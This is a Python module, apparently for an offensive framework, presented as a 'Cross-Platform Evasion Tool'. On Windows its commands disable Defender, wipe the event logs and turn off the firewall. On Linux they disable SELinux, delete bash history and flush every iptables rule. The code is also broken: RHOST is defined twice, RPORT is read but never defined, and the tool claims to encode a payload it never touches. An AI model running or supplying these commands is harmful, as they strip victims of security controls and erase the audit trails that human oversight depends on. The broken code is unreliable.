import os,pyfiglet
from collections import OrderedDict
import sys
import subprocess
from threading import Thread

MODULE_TYPE = "evasion"
# Module class definition
class ModuleClass:
    def __init__(self):
        self.info = {
            'Name': '**Cross-Platform Evasion Tool',
            'Rank':'Excellent',
            'Platform':'Windows/Linux/Macos',
            'architectures':'x86/64 bit processors',
            'Description': '### **Features**  \n- **Cross-Platform**: Applies evasion techniques for both Windows and Linux systems.  \n- **Common Techniques**:  \n  - **Windows**: Disables Windows Defender, clears event logs, and disables the firewall.  \n - **Linux**: Disables SELinux, clears Bash history, and disables iptables firewall.  \n - **Error Handling**: Handles errors gracefully.  ',
            'Author': 'pyLord@cyb3rH4ck3r',
            'Date Release': 'Tue/4/March/2025',
            'Note':'**Disclaimer**: This script is for educational and authorized testing purposes only. Unauthorized use is illegal and unethical. Always obtain explicit permission before testing any system.',
            'Options': OrderedDict([
            ('TARGET', ('', True,'Enter target OS (windows/linux):')),
            ('RHOST', ('', False,'Enter target IP')),
            ('RHOST', ('', False,'Enter target PORT'))
            
               
                ])
                }
    def logo(self):
    	title = 'Evasion Tool'
    	if pyfiglet:
    	       ascii_text = pyfiglet.figlet_format(title, font="standard")
    	       print(f"\033[91m{ascii_text}\033[0m")
    	else:
            print(title)
    def help(self):
    	print("Usage: set FILE <path/to/payload> ,then run")
   
    # Evasion Functions
    def evade_windows(self):
      try:
        print("[*] Applying Windows evasion techniques...")
        
        # Disable Windows Defender
        print("[+] Disabling Windows Defender...")
        subprocess.run("powershell -Command Set-MpPreference -DisableRealtimeMonitoring $true", shell=True)
        
        # Clear Event Logs
        print("[+] Clearing Windows Event Logs...")
        subprocess.run("wevtutil cl Security", shell=True)
        subprocess.run("wevtutil cl System", shell=True)
        subprocess.run("wevtutil cl Application", shell=True)
        
        # Disable Firewall
        print("[+] Disabling Windows Firewall...")
        subprocess.run("netsh advfirewall set allprofiles state off", shell=True)
        
        print("[+] Windows evasion completed.")
      except Exception as e:
        print(f"[-] Error: {e}")
    
    
    def evade_linux(self):
      try:
        print("[*] Applying Linux evasion techniques...")
        
        # Disable SELinux (if enabled)
        print("[+] Disabling SELinux...")
        subprocess.run("setenforce 0", shell=True)
        
        # Clear Bash History
        print("[+] Clearing Bash history...")
        subprocess.run("history -c", shell=True)
        subprocess.run("rm -f ~/.bash_history", shell=True)
        
        # Disable Firewall (iptables)
        print("[+] Disabling iptables firewall...")
        subprocess.run("iptables -F", shell=True)
        subprocess.run("iptables -X", shell=True)
        subprocess.run("iptables -t nat -F", shell=True)
        subprocess.run("iptables -t nat -X", shell=True)
        subprocess.run("iptables -t mangle -F", shell=True)
        subprocess.run("iptables -t mangle -X", shell=True)
        subprocess.run("iptables -P INPUT ACCEPT", shell=True)
        subprocess.run("iptables -P FORWARD ACCEPT", shell=True)
        subprocess.run("iptables -P OUTPUT ACCEPT", shell=True)
        
        print("[+] Linux evasion completed.")
      except Exception as e:
        print(f"[-] Error: {e}")
    def execute(self):
        self.logo()
        TARGET_OS = self.info['Options']['TARGET'][0]
        RHOST = self.info['Options']['RHOST'][0]
        RPORT = self.info['Options']['RPORT'][0]
        if TARGET_OS not in ["windows", "linux"]:
          print("[!] Invalid OS. Choose 'windows' or 'linux'.")
          return
        if TARGET_OS == "windows":
        	self.evade_windows()
        elif TARGET_OS == "linux":
          self.evade_linux()
        
        
        
        return f"[+] Encoding payload..."
    